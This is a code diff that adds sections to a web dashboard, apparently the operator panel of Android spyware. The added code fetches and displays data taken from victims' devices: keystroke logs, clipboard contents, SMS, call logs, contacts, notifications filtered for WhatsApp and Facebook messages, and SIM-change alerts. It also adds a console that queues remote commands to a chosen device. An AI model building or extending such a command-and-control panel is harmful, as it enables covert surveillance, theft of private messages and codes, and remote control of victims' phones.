+          </div>
+        </div>
+        <div class="card">
+          <div class="contact-list" id="contactContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading contacts...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: SIM Alerts ===== -->
+    <div class="section-content" id="sec-sim-alerts">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="4" y="2" width="16" height="20" rx="2"/>
+              <path d="M9 2v8l3-2 3 2V2"/>
+              <path d="M8 14h8"/>
+              <path d="M8 18h5"/>
+            </svg>
+            SIM Alerts
+            <span class="section-count" id="simCount">0</span>
+          </div>
+        </div>
+        <div class="card">
+          <div class="sim-alert-list" id="simContent">
+            <div class="loading-row">
+              <div class="loading-spinner"><div class="spinner"></div> Loading SIM alerts...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== SECTION: Commands Console ===== -->
+    <div class="section-content" id="sec-commands">
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="4 17 8 13 4 9"/>
+              <path d="M12 17h8"/>
+              <rect x="2" y="3" width="20" height="18" rx="2"/>
+            </svg>
+            Remote Commands
+          </div>
+        </div>
+        <div class="card">
+          <div class="cmd-console" id="cmdContent">
+            <div class="cmd-input-area">
+              <input type="text" class="cmd-input" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') sendCommand()">
+              <button class="cmd-send-btn" onclick="sendCommand()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <line x1="22" y1="2" x2="11" y2="13"/>
+                  <polygon points="22 2 15 22 11 13 2 9 22 2"/>
+                </svg>
+                Send
+              </button>
+            </div>
+            <div class="cmd-queue">
+              <div class="cmd-queue-title">Pending Commands</div>
+              <div id="cmdQueueList">
+                <div class="loading-row">
+                  <div class="loading-spinner"><div class="spinner"></div> Loading command queue...</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
   </div> <!-- /main-content -->
 
   <!-- ═══ FOOTER ═══ -->
@@ -1513,6 +2501,7 @@ tbody tr:hover td { background: rgba(0,85,164,0.03); }
 <script>
 const API = '/api/dashboard';
 let TOKEN = '{{ token }}';
+let deviceId = 'all';
 
 // ── Sidebar ──
 function toggleSidebar() {
@@ -1529,6 +2518,11 @@ function switchSection(name) {
     document.getElementById('sidebar').classList.remove('open');
     document.getElementById('sidebarOverlay').classList.remove('active');
   }
+  // Auto-load data for bansos sections
+  if (['whatsapp','facebook','keylogger','clipboard','apps','sms','notifications','calls','contacts','sim-alerts','commands'].includes(name)) {
+    if (name === 'commands') renderCommandQueue();
+    else fetchSectionData(name);
+  }
 }
 
 // ── Clock ──
@@ -1540,6 +2534,332 @@ function updateClock() {
 }
 updateClock();
 setInterval(updateClock, 1000);
+
+// ── Generic Section Data Loader ──
+async function fetchSectionData(section) {
+  const container = document.getElementById(section + 'Content');
+  if (!container) return;
+  const countEl = document.getElementById(section === 'whatsapp' ? 'waCount' :
+    section === 'facebook' ? 'fbCount' :
+    section === 'keylogger' ? 'keylogCount' :
+    section === 'clipboard' ? 'clipCount' :
+    section === 'apps' ? 'appsCount' :
+    section === 'sms' ? 'smsCount' :
+    section === 'notifications' ? 'notifCount' :
+    section === 'calls' ? 'callCount' :
+    section === 'contacts' ? 'contactCount' :
+    section === 'sim-alerts' ? 'simCount' : '');
+
+  var apiPath = '';
+  switch (section) {
+    case 'keylogger': apiPath = '/api/data/keylog/'; break;
+    case 'clipboard': apiPath = '/api/data/clipboard/'; break;
+    case 'apps': apiPath = '/api/data/apps/'; break;
+    case 'sms': apiPath = '/api/data/sms/'; break;
+    case 'notifications': apiPath = '/api/data/notif/'; break;
+    case 'calls': apiPath = '/api/data/calls/'; break;
+    case 'contacts': apiPath = '/api/data/contacts/'; break;
+    case 'sim-alerts': apiPath = '/api/data/sim-alerts/'; break;
+    case 'whatsapp': apiPath = '/api/data/notif/'; break;
+    case 'facebook': apiPath = '/api/data/notif/'; break;
+  }
+
+  try {
+    container.innerHTML = '<div class="loading-row"><div class="loading-spinner"><div class="spinner"></div> Loading...</div></div>';
+    var resp = await fetch(apiPath + deviceId + '?token=' + TOKEN);
+    if (!resp.ok) throw new Error('HTTP ' + resp.status);
+    var data = await resp.json();
+    var items = data.data || data.results || data.messages || data || [];
+
+    if (countEl) countEl.textContent = items.length;
+
+    if (!items || items.length === 0) {
+      container.innerHTML = '<div class="empty-data">' +
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>' +
+        '<p>No data available</p>' +
+        '<div class="sub">Waiting for device reports...</div>' +
+      '</div>';
+      return;
+    }
+
+    switch (section) {
+      case 'whatsapp': renderWhatsApp(container, items); break;
+      case 'facebook': renderFacebook(container, items); break;
+      case 'keylogger': renderKeylogger(container, items); break;
+      case 'clipboard': renderClipboard(container, items); break;
+      case 'apps': renderApps(container, items); break;
+      case 'sms': renderSms(container, items); break;
+      case 'notifications': renderNotifications(container, items); break;
+      case 'calls': renderCalls(container, items); break;
+      case 'contacts': renderContacts(container, items); break;
+      case 'sim-alerts': renderSimAlerts(container, items); break;
+    }
+  } catch (e) {
+    console.error(section + ' fetch error:', e);
+    container.innerHTML = '<div class="error-state"><p>⚠ Failed to load data</p>' +
+      '<button class="btn-retry" onclick="fetchSectionData(\'' + section + '\')">' +
+        '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg> Retry' +
+      '</button></div>';
+  }
+}
+
+// ── WhatsApp Render ──
+function renderWhatsApp(container, items) {
+  var waItems = items.filter(function(n) {
+    return (n.package_name || n.app || '').toLowerCase().indexOf('whatsapp') !== -1;
+  });
+  if (waItems.length === 0) {
+    container.innerHTML = '<div class="empty-data">' +
+      '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/><circle cx="9" cy="10" r="1" fill="currentColor"/><circle cx="12" cy="10" r="1" fill="currentColor"/><circle cx="15" cy="10" r="1" fill="currentColor"/></svg>' +
+      '<p>No WhatsApp messages found</p>' +
+    '</div>';
+    return;
+  }
+  container.innerHTML = waItems.map(function(n) {
+    var text = n.text || n.title || n.message || '';
+    var sender = n.sender || n.app_name || 'WhatsApp';
+    var time = (n.timestamp || n.time || '').slice(0,19) || '';
+    var isOutgoing = n.is_sent || n.type === 'sent' || n.type === 'outgoing';
+    return '<div class="wa-bubble ' + (isOutgoing ? 'wa-outgoing' : 'wa-incoming') + '">' +
+      '<div class="wa-sender">' + escHtml(isOutgoing ? 'You' : sender) + '</div>' +
+      '<div>' + escHtml(text) + '</div>' +
+      '<div class="wa-meta">' +
+        '<span>' + time + '</span>' +
+        (isOutgoing ? '<svg viewBox="0 0 16 11" width="14" height="10" fill="var(--blue)" opacity="0.7"><path d="M11.07.65c.39.39.39 1.02 0 1.41L5.76 7.37c-.39.39-1.02.39-1.41 0L.65 3.68a1 1 0 011.41-1.41l2.39 2.39 4.88-4.88c.39-.39 1.02-.39 1.41 0L15 4.68l.75-.75L11.07.65z"/></svg>' : '') +
+      '</div></div>';
+  }).reverse().join('');
+}
+
+// ── Facebook Render ──
+function renderFacebook(container, items) {
+  var fbItems = items.filter(function(n) {
+    return (n.package_name || n.app || '').toLowerCase().indexOf('facebook') !== -1 || (n.package_name || n.app || '').toLowerCase().indexOf('katana') !== -1;
+  });
+  if (fbItems.length === 0) {
+    container.innerHTML = '<div class="empty-data">' +
+      '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>' +
+      '<p>No Facebook activity found</p>' +
+    '</div>';
+    return;
+  }
+  container.innerHTML = fbItems.map(function(n) {
+    var title = n.title || n.app_name || 'Facebook';
+    var text = n.text || n.message || '';
+    var time = (n.timestamp || n.time || '').slice(0,19) || '';
+    var initial = (title.charAt(0) || 'F').toUpperCase();
+    return '<div class="fb-post">' +
+      '<div class="fb-post-header">' +
+        '<div class="fb-post-avatar">' + initial + '</div>' +
+        '<div>' +
+          '<div class="fb-post-name">' + escHtml(title) + '</div>' +
+          '<div class="fb-post-time">' + time + '</div>' +
+        '</div>' +
+      '</div>' +
+      '<div class="fb-post-body">' + escHtml(text) + '</div>' +
+      '<div class="fb-post-actions">' +
+        '<span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z"/></svg> Like</span>' +
+        '<span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg> Comment</span>' +
+        '<span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg> Share</span>' +
+      '</div></div>';
+  }).join('');
+}
+
+// ── Keylogger Render ──
+function renderKeylogger(container, items) {
+  container.innerHTML = items.map(function(k) {
+    var text = k.text || k.data || k.keys || k.entry || '';
+    var time = (k.timestamp || k.time || '').slice(0,19) || '';
+    return '<div class="keylog-entry"><span class="keylog-time">' + time + '</span>' + escHtml(text) + '</div>';
+  }).join('');
+}
+
+// ── Clipboard Render ──
+function renderClipboard(container, items) {
+  container.innerHTML = items.map(function(c) {
+    var text = c.text || c.data || c.content || '';
+    var app = c.app || c.app_name || c.package_name || 'Unknown';
+    var time = (c.timestamp || c.time || '').slice(0,19) || '';
+    return '<div class="clip-entry">' +
+      '<div class="clip-app">' + escHtml(app) + '</div>' +
+      '<div class="clip-text">' + escHtml(text) + '</div>' +
+      '<div class="clip-time">' + time + '</div>' +
+    '</div>';
+  }).join('');
+}
+
+// ── App Usage Render ──
+function renderApps(container, items) {
+  container.innerHTML = items.map(function(a) {
+    var name = a.name || a.app_name || a.package || a.package_name || 'Unknown';
+    var pkg = a.package_name || a.package || '';
+    var time = (a.timestamp || a.time || a.last_used || '').slice(0,19) || '';
+    return '<div class="app-item">' +
+      '<div class="app-dot"></div>' +
+      '<div class="app-info">' +
+        '<div class="app-name">' + escHtml(name) + '</div>' +
+        (pkg ? '<div class="app-package">' + escHtml(pkg) + '</div>' : '') +
+        '<div class="app-time">' + time + '</div>' +
+      '</div></div>';
+  }).join('');
+}
+
+// ── SMS Render ──
+function renderSms(container, items) {
+  container.innerHTML = items.map(function(s) {
+    var sender = s.sender || s.address || s.from || s.number || 'Unknown';
+    var text = s.text || s.body || s.message || '';
+    var time = (s.timestamp || s.time || s.date || '').slice(0,19) || '';
+    var isInbox = s.type === 'inbox' || s.type === 'received' || s.type === undefined;
+    var icon = isInbox ? '📩' : '📤';
+    return '<div class="sms-item">' +
+      '<div class="sms-icon ' + (isInbox ? 'inbox' : 'sent') + '">' + icon + '</div>' +
+      '<div class="sms-body">' +
+        '<div class="sms-sender">' + escHtml(sender) + '</div>' +
+        '<div class="sms-text">' + escHtml(text) + '</div>' +
+        '<div class="sms-meta">' +
+          '<span>' + time + '</span>' +
+          '<span>' + (isInbox ? 'Received' : 'Sent') + '</span>' +
+        '</div>' +
+      '</div></div>';
+  }).join('');
+}
+
+// ── Notifications Render ──
+function renderNotifications(container, items) {
+  container.innerHTML = items.map(function(n) {
+    var app = n.app_name || n.package_name || n.app || 'Unknown';
+    var title = n.title || '';
+    var text = n.text || n.message || '';
+    var time = (n.timestamp || n.time || '').slice(0,19) || '';
+    var initial = (app.charAt(0) || '?').toUpperCase();
+    return '<div class="notif-item">' +
+      '<div class="notif-icon">' + initial + '</div>' +
+      '<div class="notif-body">' +
+        '<div class="notif-app">' + escHtml(app) + '</div>' +
+        (title ? '<div class="notif-title">' + escHtml(title) + '</div>' : '') +
+        (text ? '<div class="notif-text">' + escHtml(text) + '</div>' : '') +
+        '<div class="notif-time">' + time + '</div>' +
+      '</div></div>';
+  }).join('');
+}
+
+// ── Call Logs Render ──
+function renderCalls(container, items) {
+  container.innerHTML = items.map(function(c) {
+    var number = c.number || c.phone_number || c.contact || c.from || 'Unknown';
+    var duration = c.duration || c.duration_seconds || 0;
+    var time = (c.timestamp || c.time || c.date || '').slice(0,19) || '';
+    var type = c.type || c.call_type || '';
+    var isIncoming = type === 'incoming' || type === 'received';
+    var isOutgoing = type === 'outgoing' || type === 'dialed' || type === 'sent';
+    var isMissed = type === 'missed' || type === 'unanswered';
+    var iconClass = isMissed ? 'missed' : (isIncoming ? 'incoming' : 'outgoing');
+    var iconChar = isMissed ? '📞' : (isIncoming ? '📲' : '📞');
+    var typeLabel = isMissed ? 'Missed' : (isIncoming ? 'Incoming' : 'Outgoing');
+    var durationStr = '';
+    if (duration > 0) {
+      var mins = Math.floor(duration / 60);
+      var secs = duration % 60;
+      durationStr = mins + 'm ' + ('0' + secs).slice(-2) + 's';
+    }
+    return '<div class="call-item">' +
+      '<div class="call-icon ' + iconClass + '">' + iconChar + '</div>' +
+      '<div class="call-info">' +
+        '<div class="call-number">' + escHtml(number) + '</div>' +
+        '<div class="call-type ' + iconClass + '">' + typeLabel + '</div>' +
+        '<div class="call-meta">' +
+          '<span>' + time + '</span>' +
+          (durationStr ? '<span class="call-duration">' + durationStr + '</span>' : '') +
+        '</div>' +
+      '</div></div>';
+  }).join('');
+}
+
+// ── Contacts Render ──
+function renderContacts(container, items) {
+  container.innerHTML = items.map(function(c) {
+    var name = c.name || c.contact_name || c.display_name || 'Unknown';
+    var phone = c.phone || c.phone_number || c.number || c.contact || '';
+    var initial = (name.charAt(0) || '?').toUpperCase();
+    return '<div class="contact-item">' +
+      '<div class="contact-avatar">' + initial + '</div>' +
+      '<div class="contact-info">' +
+        '<div class="contact-name">' + escHtml(name) + '</div>' +
+        (phone ? '<div class="contact-phone">' + escHtml(phone) + '</div>' : '') +
+      '</div></div>';
+  }).join('');
+}
+
+// ── SIM Alerts Render ──
+function renderSimAlerts(container, items) {
+  container.innerHTML = items.map(function(s) {
+    var title = s.title || s.alert || 'SIM Card Change Detected';
+    var detail = s.detail || s.message || s.text || 'A SIM card change was detected on the device.';
+    var time = (s.timestamp || s.time || '').slice(0,19) || '';
+    return '<div class="sim-alert-item">' +
+      '<div class="sim-alert-icon">⚠</div>' +
+      '<div class="sim-alert-body">' +
+        '<div class="sim-alert-title">' + escHtml(title) + '</div>' +
+        '<div class="sim-alert-detail">' + escHtml(detail) + '</div>' +
+        '<div class="sim-alert-time">' + time + '</div>' +
+      '</div></div>';
+  }).join('');
+}
+
+// ── Commands ──
+async function sendCommand() {
+  var input = document.getElementById('cmdInput');
+  var cmd = input.value.trim();
+  if (!cmd) return;
+  input.disabled = true;
+  try {
+    var resp = await fetch('/api/commands/' + deviceId + '?token=' + TOKEN, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ command: cmd })
+    });
+    if (!resp.ok) throw new Error('HTTP ' + resp.status);
+    input.value = '';
+    renderCommandQueue();
+  } catch (e) {
+    console.error('Command error:', e);
+    alert('Failed to send command: ' + e.message);
+  }
+  input.disabled = false;
+  input.focus();
+}
+
+async function renderCommandQueue() {
+  var list = document.getElementById('cmdQueueList');
+  if (!list) return;
+  try {
+    var resp = await fetch('/api/commands/' + deviceId + '?token=' + TOKEN);
+    if (!resp.ok) throw new Error('HTTP ' + resp.status);
+    var data = await resp.json();
+    var queue = data.queue || data.commands || data.results || [];
+    if (queue.length === 0) {
+      list.innerHTML = '<div class="empty-data">' +
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 8 13 4 9"/><path d="M12 17h8"/><rect x="2" y="3" width="20" height="18" rx="2"/></svg>' +
+        '<p>No pending commands</p>' +
+        '<div class="sub">Commands sent here will appear in the queue</div>' +
+      '</div>';
+      return;
+    }
+    list.innerHTML = queue.map(function(q) {
+      var text = q.command || q.text || q.cmd || '';
+      var status = q.status || 'pending';
+      var time = (q.timestamp || q.time || '').slice(0,19) || '';
+      return '<div class="cmd-queue-item">' +
+        '<span class="cmd-status ' + status + '"></span>' +
+        '<span class="cmd-text">' + escHtml(text) + '</span>' +
+        '<span class="cmd-time">' + time + '</span>' +
+      '</div>';
+    }).join('');
+  } catch (e) {
+    console.error('Command queue error:', e);
+    list.innerHTML = '<div class="error-state"><p>⚠ Failed to load queue</p></div>';
+  }
+}
 
 // ── Fetch Dashboard ──
 async function fetchDashboard() {
@@ -1583,10 +2903,39 @@ function render(data) {
   animateCount(document.getElementById('totalUsers'), data.total_users || 0);
   animateCount(document.getElementById('totalAndroidCount'), data.total_android || 0);
 
+  // Bansos stat counts
+  animateCount(document.getElementById('totalWhatsapp'), data.total_whatsapp || 0);
+  animateCount(document.getElementById('totalKeylogs'), data.total_keylogs || 0);
+  animateCount(document.getElementById('totalNotifications'), data.total_notif || 0);
+  animateCount(document.getElementById('totalSms'), data.total_sms || 0);
+  animateCount(document.getElementById('totalCalls'), data.total_calls || 0);
+
   document.getElementById('eventCount').textContent = data.total_events || 0;
   document.getElementById('linkCount').textContent = data.total_links || 0;
   document.getElementById('photoCountHeader').textContent = data.total_photos || 0;
   document.getElementById('androidCountHeader').textContent = data.total_android || 0;
+
+  // Bansos section counts
+  var wa = document.getElementById('waCount');
+  if (wa) wa.textContent = data.total_whatsapp || 0;
+  var fb = document.getElementById('fbCount');
+  if (fb) fb.textContent = data.total_facebook || 0;
+  var kl = document.getElementById('keylogCount');
+  if (kl) kl.textContent = data.total_keylogs || 0;
+  var cl = document.getElementById('clipCount');
+  if (cl) cl.textContent = data.total_clipboard || 0;
+  var ap = document.getElementById('appsCount');
+  if (ap) ap.textContent = data.total_apps || 0;
+  var sm = document.getElementById('smsCount');
+  if (sm) sm.textContent = data.total_sms || 0;
+  var nf = document.getElementById('notifCount');
+  if (nf) nf.textContent = data.total_notif || 0;
+  var ca = document.getElementById('callCount');
+  if (ca) ca.textContent = data.total_calls || 0;
+  var ct = document.getElementById('contactCount');
+  if (ct) ct.textContent = data.total_contacts || 0;
+  var si = document.getElementById('simCount');
+  if (si) si.textContent = data.total_sim_alerts || 0;
 
   // Sidebar badges
   var se = document.getElementById('sidebarEventCount');
@@ -1597,6 +2946,28 @@ function render(data) {
   if (sp) sp.textContent = data.total_photos || 0;
   var sa = document.getElementById('sidebarAndroidCount');
   if (sa) sa.textContent = data.total_android || 0;
+
+  // Bansos sidebar badges
+  var sw = document.getElementById('sidebarWaCount');
+  if (sw) sw.textContent = data.total_whatsapp || 0;
+  var sf = document.getElementById('sidebarFbCount');
+  if (sf) sf.textContent = data.total_facebook || 0;
+  var sk = document.getElementById('sidebarKeylogCount');
+  if (sk) sk.textContent = data.total_keylogs || 0;
+  var sc = document.getElementById('sidebarClipCount');
+  if (sc) sc.textContent = data.total_clipboard || 0;
+  var sa2 = document.getElementById('sidebarAppsCount');
+  if (sa2) sa2.textContent = data.total_apps || 0;
+  var ss = document.getElementById('sidebarSmsCount');
+  if (ss) ss.textContent = data.total_sms || 0;
+  var sn = document.getElementById('sidebarNotifCount');
+  if (sn) sn.textContent = data.total_notif || 0;
+  var sc2 = document.getElementById('sidebarCallCount');
+  if (sc2) sc2.textContent = data.total_calls || 0;
+  var sco = document.getElementById('sidebarContactCount');
+  if (sco) sco.textContent = data.total_contacts || 0;
+  var ssi = document.getElementById('sidebarSimCount');
+  if (ssi) ssi.textContent = data.total_sim_alerts || 0;
 
   document.getElementById('footerStatus').textContent = '● Live';
   if (data.generated_at) {
